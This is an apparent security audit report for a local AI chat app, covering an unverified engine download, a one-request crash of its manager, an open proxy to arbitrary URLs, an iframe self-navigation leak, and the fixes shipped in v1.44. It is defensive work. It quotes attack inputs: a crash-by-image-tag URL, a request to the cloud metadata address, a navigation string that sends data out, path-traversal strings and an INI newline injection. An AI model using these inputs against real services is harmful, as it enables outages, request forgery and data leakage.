# Security audit

**Status: complete, and fixed in v1.44.** Audited at `4df63a8` (v1.43), 2026-11-14,
in the Win11 guest (`192.168.183.134`). Scope fixed in `PLAN.md` §Security audit:
the six items where a bug hurts the person *running* the app. The audit itself is
findings-only — the fixes are v1.44 and are logged at the bottom of this file with
the check that proves each one.

The question being answered is **"is it safe for someone else to run"** — not "is
the source safe to read". Source visibility is the cheap ring: nothing is
listening beyond loopback. What changes with an audience is that strangers run
*our* installer, and this app downloads and executes a llama.cpp build and a
SearXNG tree.

## Method, and what "done" means here

Two halves, because the six rows are two kinds of work:

- **Half A — read and verify.** Engine download, SearXNG installer, the manager,
  uploads, plus the speech path and the preview document builder. Read against the
  code, with the specific claims tested where a claim is testable without a
  browser (`server/net/guard.mjs` imported directly; the unhandled-rejection
  mechanism reproduced in a throwaway process). Nothing in Half A writes, spawns
  or reaches the network.
- **Half B — execute.** `scripts/guard-tests.mjs` and
  `scripts/preview-attack-tests.mjs` **in the guest VM**, then the SearXNG
  install → start → uninstall lifecycle. These are the two suites that already
  exist; running them *is* the audit for rows 5 and 6. They are guest-only by the
  project's own rule.

A row is not "passed" on the strength of the code looking right. Where a row is
only verified by reading, this file says so.

## Verdicts

| # | Item | Half | Verdict |
|---|---|---|---|
| 1 | Engine download | A | **FAIL** — F-1 (no checksum at all on official builds), F-5 |
| 2 | SearXNG installer | A + B | **PASS, one low finding** — F-7 |
| 3 | The manager | A | **FAIL** — F-2 (unauthenticated crash), F-3 (open proxy), F-6 |
| 4 | Uploads | A | **PASS with hardening** — F-10 |
| 5 | Workspace guard | A + B | **PASS — 21/21 in the guest**, four new junction assertions included |
| 6 | Preview panel | A + B | **FAIL — 34/37.** F-4 is confirmed, not theoretical: the page reached the spy twice |
| — | Speech (added to scope) | A | **PASS** — no shell, id-lookup path, caps all hold |

Findings by severity: **2 high, 3 medium (one now proven), 5 low**. None is a
memory-safety or remote-code-execution bug. Two block "a stranger can run this
safely" (F-1, F-2); F-4 needs a fix and a re-run of its suite before the preview
panel can be called sandboxed-and-proved.

---

## Findings

### F-1 · High · Engine: official builds are downloaded and executed with no checksum

`server/engine/catalog.mjs:13-15` states that official ggml-org releases "publish
no checksums, so their hashes are pinned here". **They are not pinned.**
`pickSource()` returns no `sha256` for any `provider: 'official'` descriptor, so
`server/engine/install.mjs:85` (`sha256: source.sha256 ?? null`) is always `null`,
and `install.mjs:144-152` then sets `verified = false` and **extracts anyway**.

`grep -rn sha256 server/` returns no pinned hash anywhere in the tree. The only
verified path is `provider: 'lemonade'`, which fetches `checksums.txt` from the
same release at runtime — that is the AMD-on-Windows path.

**Who this hits.** Every user who is not on an AMD card in the `AMD_GFX` table:
NVIDIA (CUDA), Intel and unmatched AMD (Vulkan), all macOS and all Linux. That is
most strangers. They download a zip or tarball over HTTPS, we hash it, we print
"no published checksum for this build" in the panel, and we unpack and run it.

**Impact.** The whole integrity story for the highest-value target in the app is
"HTTPS to github.com". A compromised release, a hijacked DNS/TLS path, or a
mirror means arbitrary code execution on first run — in exactly the scenario the
audit exists for.

**Fix.** Two changes, both small:
1. Pin the sha256 per asset in `catalog.mjs` (the comment says they were computed
   once from the downloaded asset — restore them, and `resolveAsset` already
   reads `source.sha256`).
2. Make unverified **a refusal with an explicit opt-in**, not a warning line.
   `progress.verified === false` currently means "we carried on anyway".

Also note `OFFICIAL_BUILD = 'b12284'` is a constant, which is right — the URL is
built from a fixed catalog and never from request input (verified, PASS).

### F-2 · High · Manager: `/api/file/` with malformed percent-encoding kills the process

Three lines conspire:

- `server/index.mjs:229` — `decodeURIComponent(url.pathname.slice(...))` is the
  **first statement of `handleFile`, outside its `try`**.
- `server/index.mjs:317` — `void handleFile(res, url)` discards the promise, so a
  `URIError` becomes an unhandled rejection.
- `server/index.mjs:314-319` — `/api/file/` is deliberately the **one read-only
  route ahead of the `X-Hearth` gate**, because `<img>` cannot send headers.

**Evidence.** The mechanism was reproduced in a throwaway process:

```
$ node repro.mjs            # async fn, called with void, first statement throws
URIError: URI malformed
Node.js v24.21.0
--- exit code: 1 ---
```

Node exits non-zero on an unhandled rejection. The manager is an ESM entry point,
so the same path ends it.

**Impact.** Any web page the user visits can stop their manager with one image
tag — `<img src="http://127.0.0.1:8090/api/file/%">` — no custom header, no CORS
preflight, no user click. The app then loses its backend, the served model (the
child is orphaned, not stopped), speech and search, until it is restarted. No data
loss, but it is a one-request kill of the trusted component, reachable from
off-origin, which is the one thing that route is supposed to be safe about.

**Fix.** Move the decode inside the `try`, add `.catch()` at the call site, and add
a manager-wide `process.on('unhandledRejection')` that logs instead of dying —
that net is worth having regardless, because every other route relies on
`.catch()` being remembered.

### F-3 · Medium · Manager: `/api/models` and `/api/chat` will proxy to any http(s) URL

`backendBase()` (`server/index.mjs:589-595`) validates the protocol and nothing
else. `baseUrl` comes straight from the request body (chat) or query string
(models). So the "only route to a backend" is also a general request-forgery
primitive: `POST /api/chat` with `baseUrl: "http://169.254.169.254"` and an
attacker-chosen JSON body will be sent, and the response streamed back.

`server/net/guard.mjs` — the SSRF guard — is applied only in `readUrl`, i.e. only
to `/api/fetch`. It is good (see "verified" below) and it does not apply here.
The `network` switch is not consulted either, so this is a second egress point
that bypasses the one-switch rule the code documents at line 396-398.

**Impact.** Today the only caller is the trusted app, so this is *latent*, not
exploited. It matters because (a) it contradicts the egress design, which other
decisions lean on; (b) the app's own input is increasingly untrusted — the preview
panel is a place where model-written code runs, and the reason it is safe is that
it cannot reach the manager. A proxy that accepts any URL is the primitive such a
bug would want.

**Fix.** Allowlist `baseUrl` to loopback by default, with the external-backend
case (`docs/backend.md` / Strata on 8080) as an explicit config opt-in that names
the allowed origin. Failing that, run it through `checkUrl` with a loopback
exemption for exactly the configured backend.

### F-4 · Medium · Preview: the page can navigate itself out, and the fixture never tries

`PREVIEW_CSP` (`app/src/lib/preview.ts:29-32`) has no `navigate-to` hint — Chrome
never shipped it — and the iframe sandbox carries no `allow-top-navigation`. So a
page **cannot** move the app's window, but it *can* navigate its own frame:
`location = 'https://host/?d=' + something`, or `<meta http-equiv="refresh">`
(which CSP does not govern at all).

`scripts/preview-attack-fixture.html` makes 16 attempts — parent/top DOM,
IndexedDB, localStorage, fetch with and without the header, external fetch, the
spy, an img pixel, sendBeacon, form submit, WebSocket, window.open, top
navigation, cookies — and **does not attempt a self-navigation**. So
`spyHits.length === 0` proves nothing about this channel: no attempt was made.

**Impact.** The frame holds no app data — the document is assembled from the
model's own reply, so there is no conversation to steal. What it does hold is (a)
an outbound signal (page opened, user's IP, timing) to a host the model named, and
(b) a **phishing surface inside our own chrome**: replace the panel with a remote
page styled like Hearth and it is a login prompt the user has no reason to
distrust. That second one is the reason this is a finding rather than a note.

**Confirmed in the guest, 2026-11-14.** The two navigation attempts were added to
the fixture (approved as one of three harness additions) and the suite went from
green to 34/37:

```
  FAIL  the spy heard nothing at all  GET /leak=meta | GET /leak=nav
  FAIL  BLOCKED  self navigation (meta refresh and location)  GET /leak=meta | GET /leak=nav
  FAIL  no response reached the preview frame from any host
        204 http://127.0.0.1:8099/leak=meta | 204 http://127.0.0.1:8099/leak=nav
  PASS  BLOCKED  top navigation (parent URL unchanged)
  PASS  no frame ended up on a foreign URL
```

Two facts worth reading carefully. The requests **left the frame** with a path the
page chose — that is the exfil channel, and the sandbox does not stop it (only the
*top* frame is protected). And `page.frames()` shows no frame sitting on the spy's
URL afterwards: the spy answered `204 No Content`, so nothing committed and the
page continued rendering as if nothing happened. The attempt is therefore
**silent** — the user sees the page they asked for while it phones home, and it can
do so repeatedly. That is worse than the theoretical version of this finding and
it is why the suite should stay red until it is fixed.

**Fix.** The parent can detect it: the iframe's `load` event fires on navigation.
Any load after the initial render means the page left — reset `srcdoc` to a
"this page tried to load an external address" state. Then the suite's three
failing checks are the regression test; they should be green when this is done.

### F-5 · Medium · Engine: a failed install leaves the archive, and a half-extracted build counts as installed

- `install.mjs:144-147` throws on checksum mismatch **before** `rm(archive)` at
  156, which only runs on success. A failed or mismatched download leaves
  `data/engine/<asset>.zip` behind (hundreds of MB, and a stale file a future
  run happily truncates).
- `isInstalled()` (`install.mjs:167-174`) returns true if the binary path exists.
  A kill during extraction leaves a truncated `llama-server.exe`, and
  `resolveEngine` (`resolve.mjs:66-67`) will treat it as installed and `start()`
  will spawn it. PLAN's row says "nothing executable left on failure"; for the
  *extract* failure that is not true.

**Fix.** `rm` the archive in a `finally`; write an install marker after a
successful extract and have `isInstalled` require it. The SearXNG installer in
this same tree already does exactly this (`marker` written last, deleted last) —
reuse the pattern rather than inventing one.

### F-6 · Low · Manager: `ctx`/`ngl` reach the generated preset INI unvalidated

`POST /api/start` passes `{ctx, ngl}` from the body into `buildPreset`
(`index.mjs:842-845` → `preset.mjs:48-49`), which writes `c = ${ctx}` and
`n-gpu-layers = ${ngl}` verbatim. `POST /api/config` filters the *keys* but not
the *values* (`index.mjs:831-834`), so the same fields arrive from Settings.

A string with a newline injects INI lines into `data/models-preset.ini`, which
directs which GGUF paths llama-server loads. Needs the trusted app to send it, so
it is a hardening item, not an exploit — and it is one `Number.isInteger` check
away from being closed.

### F-7 · Low · SearXNG: the pidfile is trusted enough to signal an unrelated process

`alive()` and `stop()` (`server/searxng/install.mjs:111-125`, `426-439`) believe
`data/searxng/pid` with no corroboration. `process.kill(pid)` on a **recycled**
pid kills whatever now holds it. The pidfile's whole job is to survive a manager
that died badly — which is also the state where it is most likely stale (hard
reboot, force-kill), so this is reachable.

**Fix.** Before signalling, confirm the process is that venv's `python.exe`
running `searx.webapp` — the project already does command-line checks elsewhere.
Store the start time alongside the pid and compare if the check is too slow.

**Measured, and it downgrades the need rather than the bug.** In the guest the
adoption path never fires: a force-killed manager takes the Python child with it
(it dies on a write to the broken pipe), so no stale pidfile is ever left behind by
that route, and `remove` in the same run left nothing running. The hazard stands
for the paths that *do* leave a pidfile — a manager that exits on an uncaught
exception (which is F-2), a machine that reboots with the file on disk — but it is
not the everyday case. The simplest fix may be to drop the pidfile entirely now
that the measure says the child does not survive its parent, and keep the check
only if some case proves otherwise.

### F-8 · Low · Harness: `guard-tests.mjs --root <path>` deletes `<path>` first

`scripts/guard-tests.mjs:82` — `await rm(ROOT, { recursive: true, force: true })`
before building its fixture. `--root .` from the repo, or a mistyped
`--root C:/Users/you/…`, recursively wipes it with no prompt. This is a script we
hand to strangers along with the source.

**Fix.** Refuse a root that is not obviously disposable (name must end in `-guard`,
or live under the OS temp dir), or build the fixture with `mkdtemp` and ignore
`--root` for the tree itself.

The guard *itself* is not implicated — see the verified section.

### F-9 · Low · Two executable lookups trust PATH

`spawn('powershell', …)` in `server/metrics/index.mjs:59` and
`server/engine/detect.mjs:39` resolve through PATH. A `powershell.exe` planted
earlier in PATH runs with the manager's privileges and the user's token. Fix:
`join(process.env.SystemRoot ?? 'C:\\Windows', 'System32/WindowsPowerShell/v1.0/powershell.exe')`.

Related, informational: `detect.mjs:61-65` is **the one place in the repo that uses
a shell** (`sh -c "lspci | grep …"`). It is safe because the string is a constant
with no interpolation — but it is the exception to "argv is never a shell string"
and should carry a comment saying so, or it will be copied someday.

### F-10 · Low · Uploads: served without `X-Content-Type-Options: nosniff`

`server/index.mjs:238-242` derives `Content-Type` from the extension and is
correct, so no modern browser will sniff these away from `image/*`. The header is
one line and closes the "old browser, declared type ignored" case for anyone
reading our source and copying the route.

---

## Verified — what was checked and held

Each row records the specific property, how it was checked, and the evidence.

### 1. Engine download (partial pass)

| Claim | Result |
|---|---|
| URL built from a fixed catalog, never from request input | **PASS** — `pickSource({os, arch, gpu})` takes only the host's own detection (`detect.mjs`); the download route calls `detect()` itself and never reads the body (`index.mjs:374-394`) |
| Checksum verified before extraction | **FAIL** for `provider: 'official'` (F-1); **PASS** for lemonade — hash computed streaming during download (`install.mjs:95-107`) and compared before `extract()` is called |
| The hash comes from the same release as the asset | yes, and that is the residual risk (see below): it proves integrity-in-transit, not authenticity |
| Extraction confined to `data/engine` | **PASS by construction** — `dest` is `engineDir(DATA)`, computed on the server; archive path is `join(dest, filename)` |
| Archive deleted after unpacking | **PASS** on success (156), **FAIL** on failure (F-5) |
| No executable left on a *verification* failure | **PASS** — the throw precedes `extract()` |

### 2. SearXNG installer (pass, lifecycle pending)

| Claim | Result |
|---|---|
| Pin is a constant, not a request parameter | **PASS** — `SOURCE.sha = 'de722ab1b'`, `export const` (`install.mjs:27-31`) |
| Fetched over HTTPS | **PASS** — `https://codeload.github.com/…` |
| Extraction confined to `data/searxng` | **PASS by construction** — `-C p.app` + `--strip-components=1`, both from constants; nothing from a request |
| Settings: loopback, no limiter, no image proxy | **PASS** — `bind_address "127.0.0.1"`, `limiter False`, `image_proxy False`, random `secret_key`, JSON format added (`install.mjs:210-229`) |
| Child killed when the manager exits | **PASS** — `stop()` on SIGINT/SIGTERM and in `process.on('exit')` (`index.mjs:886-901`); pidfile adoption covers a manager that died without running either |
| Marker written last, deleted last | **PASS** — written after venv/deps/settings (`install.mjs:332-340`); uninstall deletes venv/app/settings/pid/log, then marker, then root (`455-471`) |
| Partial install cannot look clean | **PASS** — failure path `rm`s the whole root (`346-354`) |

Residual: no signed artefact exists for a git tarball. HTTPS + a pinned commit is
the strongest thing available; it is recorded as accepted risk below.

### 3. The manager (partial pass — see F-2, F-3, F-6)

| Claim | Result |
|---|---|
| Binds loopback only | **PASS** — `server.listen(PORT, '127.0.0.1')` (`index.mjs:865`); the only other listener is llama-server, whose host comes from config and defaults to `127.0.0.1` (`resolve.mjs:27`) |
| `X-Hearth` gate enforced | **PASS** for everything except `/api/file/` (by design, and F-2 is what that costs) |
| Origin allowlist exact | **PASS** — `Set(['http://localhost:5173','http://127.0.0.1:5173'])`, echoed only on an exact match, `Vary: Origin`, no `Allow-Credentials` (`index.mjs:46`, `175-183`) |
| No CORS for `Origin: null` | **PASS** — `null` is not in the set, so no `Access-Control-Allow-Origin` is emitted; a sandboxed frame's preflight fails. The attack suite asserts this too (`preview-attack-tests.mjs:92-103`) |
| argv is never a shell string | **PASS** — every `spawn`/`execFile` in the manager is an argv array; no `shell: true` anywhere in `server/` (grep). The one `sh -c` is a constant (F-9) |
| Models directory validated before use | **PASS** — `resolveModelsDir` → `exists` checked before `buildPreset` (`index.mjs:103-109`) |
| Child lifecycle | **PASS** — `stop()` on SIGINT/SIGTERM/exit, and `/api/stop` before the manager is killed (`886-901`) |
| Client cannot widen exposure silently | **partial** — `bindHost` is in the `/api/config` allowlist with no validation (`index.mjs:831`), so the app can set `0.0.0.0`. Documented in `references/vm-sandbox.md` as intentional; worth a validation warning. |

### 4. Uploads (pass, one hardening note)

| Claim | Result |
|---|---|
| Filename generated server-side | **PASS** — `${Date.now().toString(36)}-${randomBytes(4).toString('hex')}.${ext}` (`index.mjs:216`); nothing from the client becomes a name |
| Extension derived from content type | **PASS with a caveat** — derived from the *declared request* `Content-Type`, which the client chooses; safe only because the allowlist is three image types and the *served* MIME is derived from the same extension, so a mismatch is not possible. Worth a comment saying so. |
| Size capped | **PASS** — `readBody(req, limit = 25e6)`, checked while streaming and `req.destroy()`ed, not after buffering (`185-201`) |
| Read route confined to `data/` by a strict pattern | **PASS** — `SAFE_PATH = /^(avatars|attachments)\/[A-Za-z0-9._-]+$/` then `normalize` then `startsWith(normalize(DATA) + sep)`; tested: `attachments/x/../../config.json`, `%2e%2e`, `..%5c..`, `C:evil.png` all rejected, and the two that pass the regex (`..`, `.`) are caught by the prefix check |
| No traversal through the URL | **PASS** — single segment only; decode happens after the slice, and the regex is applied to the decoded value |

Symlinks inside `data/avatars` are not `realpath`-checked; an attacker would need
write access to that folder first, at which point the game is over. Noted, not a
finding.

### 5. Workspace guard (pass by reading — suite pending)

`server/workspace/files.mjs` is the strongest code in the tree:

- `under()` uses `path.relative`, and win32 `relative` is case-insensitive, so
  `C:\Users\you` vs `C:\Users\You` cannot be used to escape.
- `safePath` checks the textual path **and then `realpath`** and checks again —
  the second check is what catches a symlink inside the root pointing out.
- A non-existent leaf falls back to the textual path, but every caller then
  `stat`s it, so it cannot be read.
- `listTree` and `walk` recurse only on `entry.isDirectory()`, and a directory
  symlink or Windows junction reports `isSymbolicLink()` instead — so the walk
  does not follow links out, and `readWorkspaceFile` would refuse one anyway.
- Caps: 2 MB per file, 800 lines, 20k chars, `MAX_WALK_FILES` 5000, depth 4,
  SKIP_DIRS/SKIP_EXT lists.

Two things the suite does not cover and the VM run should add: a **junction /
reparse point** to a directory outside the root, and a **unicode / space path**.
A regex `searchFiles` with catastrophic backtracking can block the event loop;
the model supplies the pattern, so it is self-inflicted, but it is a
`MAX_WALK_FILES`-sized stall.

### 6. Preview panel (pass with gap — see F-4)

| Claim | Result |
|---|---|
| Sandbox is `allow-scripts` and nothing else | **PASS** — `PreviewPanel.tsx:145`; asserted by the suite (`preview-attack-tests.mjs:261-263`) |
| Never `allow-same-origin` | **PASS** — absent, and asserted |
| CSP present, `connect-src 'none'` | **PASS** — `preview.ts:29-32`; also `form-action`, `base-uri`, `object-src`/`frame-src`/`worker-src` all inherit `default-src 'none'` |
| CSP cannot be loosened by the page | **PASS** — ours is inserted first and CSP policies intersect |
| No injection sinks in the app | **PASS** — `grep` for `dangerouslySetInnerHTML|innerHTML|eval(|new Function` across `app/src` returns only the preview's `srcdoc` and sandbox comments |
| Frame cannot reach the manager | **PASS** — opaque origin, no ACAO for `null`, and the custom header needs a preflight we refuse |
| Fixture covers the channels | **partial, and it found something** — 18 attempts after the addition; `img pixel`, beacon, WS, form, popup, top-nav, IndexedDB, localStorage, cookies and both fetch variants all blocked. The two navigation attempts reach the spy: **F-4** |

### Speech (added to scope this audit)

| Claim | Result |
|---|---|
| argv built from user text never touches a shell | **PASS** — the utterance is a JSON body to `127.0.0.1:<port>/v1/audio/speech`; `spawn(engine.path, args)` takes only config-derived paths (`tts/index.mjs:212-224`); no shell in the audio path |
| Speaker clip path goes through an id lookup, not a path | **PASS** — `voiceFile()` intersects the id with a fresh `listVoices()` readdir and returns `join(voicesDir, hit.file)` from the *listing*, so a `../` id simply does not match (`111-115`, `277-278`) |
| Clip import: type allowlist, size cap, safe name | **PASS** — extension allowlist (`wav mp3 flac ogg m4a opus`), 20 MB cap, name reduced to `[a-zA-Z0-9 _-]` and de-duplicated (`121-142`) |
| Clip read cap | **PASS** — `MAX_VOICE_BYTES` 20 MB, and the route body limit is 30 MB |
| TTS server bound to loopback | **PASS** — hardcoded `--host 127.0.0.1` |

### Secondary — the "check it once" items

| Item | Result |
|---|---|
| `npm audit --omit=dev` | **0 vulnerabilities** (run 2026-11-14 against `app/`) |
| Manager dependencies | **none** — `server/` has no `package.json` and imports only `node:` builtins. No supply chain to audit on the component that spawns processes. |
| Provider keys | **PASS** — Brave key lives in `data/config.json` (gitignored) or `HEARTH_BRAVE_KEY`; `/api/search` returns `hasKey` and never the value (`index.mjs:741-749`); nothing key-shaped is tracked in git (`git ls-files` clean) |
| Backups are plaintext | **by design, documented** — an exported `.json` is the whole library. The UI must say so; that is a README/UI obligation, not a code fix. |
| Metrics sampler | **PASS** — fixed script path from `import.meta.url` (`metrics/index.mjs:22`), no request input, `-ParentPid` guard, stopped on every exit path (`index.mjs:889-901`). PATH lookup is F-9. |
| Import path | **not re-verified** — needs the shape/version validation re-read after the last schema change; small, and it belongs with Half B since a malformed-import test wants a throwaway browser profile. |

---

## Residual risks to record, not fix

These are the sentences the README has to be able to say out loud. None blocks
publishing; all of them stop us claiming "secure".

1. **The SearXNG tarball is not signed.** A git commit tarball has no signature to
   verify, so integrity is HTTPS + a pinned SHA. Accepted.
2. **The engine checksum comes from the same release as the binary.** It proves the
   file arrived intact, not who made it. Trust anchors on the GitHub account of
   `lemonade-sdk` and on the sha we pin for ggml-org — plus, per F-1, on nothing at
   all for official builds until that is fixed.
3. **DNS rebinding is not closed.** `guard.mjs` checks the hostname, then fetches;
   a name that answers public then private slips between the two. Documented in
   the module, proportionate for a local app whose egress the user switched on.
4. **CSP does not govern WebRTC.** A preview page could open a `RTCPeerConnection`
   to a STUN server the model named and leak the local IP. Data exfiltration over
   ICE is theoretically possible. Not attempted by the fixture; no app data is in
   the frame.
5. **The preview page can be replaced by a remote page** (F-4) — a phishing
   surface inside our chrome, not a data leak.
6. **Loopback apps are reachable by any local page** that guesses the port. The
   `X-Hearth` + exact-origin pair is the defence, and F-2 is the hole in it.

---

## Half B — what ran in the guest

Guest `DESKTOP-O2U09T1`, `192.168.183.134`, Node 24.11. `C:\hearth` re-synced from
a `git archive` of `4df63a8` (plus the three harness additions below), manager on
`127.0.0.1:8090`, vite on `[::1]:5173`. No model, no engine — none is needed for
any of this.

### Guard suite — 21/21

`node scripts/guard-tests.mjs --root C:\hearth-guard --manager http://127.0.0.1:8090 --system-paths`

```
  PASS  workspace opens on the fixture
  PASS  reads a file inside the root
  PASS  numbers the lines it returns
  PASS  refuses parent traversal
  PASS  refuses nested traversal
  PASS  refuses absolute path to a sibling
  PASS  refuses system file
  PASS  refuses list outside the root
  PASS  refuses search outside the root
  PASS  refuses a binary file
  PASS  refuses a file over the size cap
  PASS  refuses a symlink pointing out of the root
  PASS  refuses a read through a directory junction out of the root
  PASS  refuses a listing through a directory junction out of the root
  PASS  refuses a search through a directory junction out of the root
  PASS  does not see through a junction when searched from the root
  PASS  reads a unicode filename containing spaces
  PASS  finds text in a unicode-named file
  PASS  finds text inside the root
  PASS  closes the workspace
  PASS  refuses every tool while closed

  21 passed, 0 failed
```

The symlink case **ran** rather than skipping — the guest account has the
privilege, which is the reason this suite belongs here. The four junction
assertions are the new ones: a directory junction out of the root is refused by
`read`, `list` *and* `search`, and a root-level search does not see through it.
That is the case the guard's design predicts would hold (a junction reports as a
symlink, so the walk never recurses into it, and `realpath` refuses the leaf) —
now it is measured rather than predicted. 15 checks became 21.

### Preview attack suite — 34/37, three failures that are the finding

See **F-4**. 18 channel attempts after adding the two navigation ones; every
pre-existing assertion still passes, including `fetch` with and without the
header, the img pixel, beacon, form, WebSocket, popup, top navigation, indexedDB,
localStorage and cookies.

### SearXNG lifecycle — pass, with one honest gap

| Step | Result |
|---|---|
| install (download → tar → venv → pip → settings) | **PASS** — 47 s, `phase: done`, marker written, `python 3.12` found via `py -3.12` |
| serves after install | **PASS** — `/healthz` 200; `GET /search?q=hearth&format=json` → **200, 42 results** (proves the settings writer's `formats: json`, the `pwd` shim and the venv all work) |
| `stop` | **PASS** — `/api/searxng/stop` → port 8888 refuses, `running=false`, pidfile cleared, no `python.exe` left |
| manager restart with it installed | **PASS** — the boot path auto-starts it (`provider: searxng` + `installed`), `running=true`, `/healthz` 200 |
| `remove` | **PASS** — `removed=true installed=false`, `data/searxng` gone entirely, 8888 refused, configured `searxngUrl` cleared |
| pidfile adoption after a manager that died badly | **NOT EXERCISED** — see below |

**Adoption did not get tested, and the reason is worth recording.** The scenario is
"the manager is force-killed while SearXNG is up; the pidfile is the new manager's
only handle". It does not happen here: `taskkill /F` on the manager took the
Python child with it — no orphan, 8888 closed, no `python.exe` — because the child
holds pipes to a dead parent and dies on its next write. So the pidfile path is
**belt-and-braces that this test could not reach**, and F-7 (a stale pid pointing
at a recycled process) stays theoretical. That is the safe direction for the
outage, and it is not the same as "adoption works".

Two non-security observations from the same run:

- `progress.phase` becomes `done` inside `install()`, *before* the manager's
  `.then(start)` runs, so a poller that stops at `done` is looking at a server that
  is still booting. My first probe did exactly that and reported a false failure;
  the instance answered 5 s later. The UI should treat "installed and running" as
  two facts.
- `remove` clears `search.searxngUrl` but leaves `provider: "searxng"`, so the
  app is configured for a provider with no address. Harmless, slightly confusing.

### F-2, reproduced against the real manager

```
$ curl "http://127.0.0.1:8090/api/file/%"      # no X-Hearth, no Origin
$ netstat -ano | findstr ":8090"
   (nothing listening)
```

and the manager's own last words:

```
file:///C:/hearth/server/index.mjs:229
  const rel = decodeURIComponent(url.pathname.slice('/api/file/'.length))
              ^
URIError: URI malformed
    at decodeURIComponent (<anonymous>)
    at handleFile (file:///C:/hearth/server/index.mjs:229:15)
    at Server.<anonymous> (file:///C:/hearth/server/index.mjs:317:10)
Node.js v24.11.0
```

One unauthenticated request, one dead manager. That is the finding finished: the
mechanism was reproduced in isolation, and the consequence is now a stack trace
from the real process.

## Fixed in v1.44

Each finding has a change and a check. The checks run in the guest; the numbers are
from the final tree.

| # | Change | Proved by |
|---|---|---|
| F-1 | `resolveAsset` takes GitHub's per-asset `sha256:` digest for official builds (a catalog pin still wins); `install()` **refuses** an unverified build before downloading | resolver returns a 64-hex digest for CUDA, ROCm, Vulkan, macOS arm64 and Linux; a planted asset name is refused with nothing on disk |
| F-2 | decode moved inside the `try`; the route's promise is `.catch`ed; `process.on('unhandledRejection')` + `uncaughtException` log instead of exiting | `GET /api/file/%`, `%zz`, `%e0%a4%a` → 400, and `/api/status` still answers after all three |
| F-3 | `backendBase` accepts loopback only; `allowRemoteBackend` (off by default) opens it for a backend on another machine; Settings has the switch | non-loopback `baseUrl` → 400 on `/api/models` and `/api/chat`; the opt-in flips it to a 502 (attempted), and flipping it back refuses again |
| F-4 | Panel watches the iframe's `load`: a second load means the document moved, so the frame is replaced with a static notice and the page is **not** re-run. Declarative `<meta refresh>` is stripped at assembly | suite: notice shown, frame no longer holds the page, no further requests, and the three "prevented" assertions still hold |
| F-5 | archive deleted in a `finally`; `.installed.json` marker written after a complete extract, and `isInstalled` reads it; `adoptLegacy` covers pre-v1.44 installs | adoption: pre-marker binary reports installed and writes `{adopted: true}`; removing it reports not installed |
| F-6 | `wholeNumber()` at every route that takes `ctx`/`ngl`, plus an integer check in `buildPreset`; `bindHost` must be an IP literal | `ctx` with a newline → 400 from `/api/config` and `/api/start`; `bindHost: not-an-ip.example` → 400; a real `ctx` still saves |
| F-7 | the pidfile is never signalled — only a process the manager spawned is killed — and `start()` adopts a live port instead of fighting it | lifecycle: `stop` closes 8888 with no `python.exe` left; `status` reports `unattributed` for a foreign pid |
| F-8 | `assertDisposable()`: refuses a `--root` that is not named `hearth-guard` or under the temp dir | `--root C:\hearth-scratch` refused, and the folder plus its file survived |
| F-9 | PowerShell resolved by absolute path in `metrics/` and `engine/detect.mjs`; the one `sh -c` is commented as the exception it is | metrics and GPU detection both answer on Windows |
| F-10 | `X-Content-Type-Options: nosniff` on the file route | uploaded PNG served as `image/png` with nosniff |

Suite totals on the final tree: fix probes **21/21**, workspace guard **21/21**,
preview attack suite **41/41** (with one `KNOWN` line for the navigation it cannot
prevent), engine adoption + Settings **12/12**, `tsc`/`build`/`check:theme` clean.

### What is still true after the fixes

- **A preview page can still issue one navigation** and its request still goes out.
  No CSP directive governs it. What changed is that a page that commits a document
  is caught and replaced, the declarative form is stripped, and the silent case (a
  no-content answer) is written down rather than denied.
- **Residual risks 1–4 below are untouched** — the SearXNG tarball has no signature,
  the engine digest anchors on the releasing account, DNS rebinding is open, and
  CSP cannot govern WebRTC.
- **The import path was not re-read** this session. It is the one secondary item
  still owed.
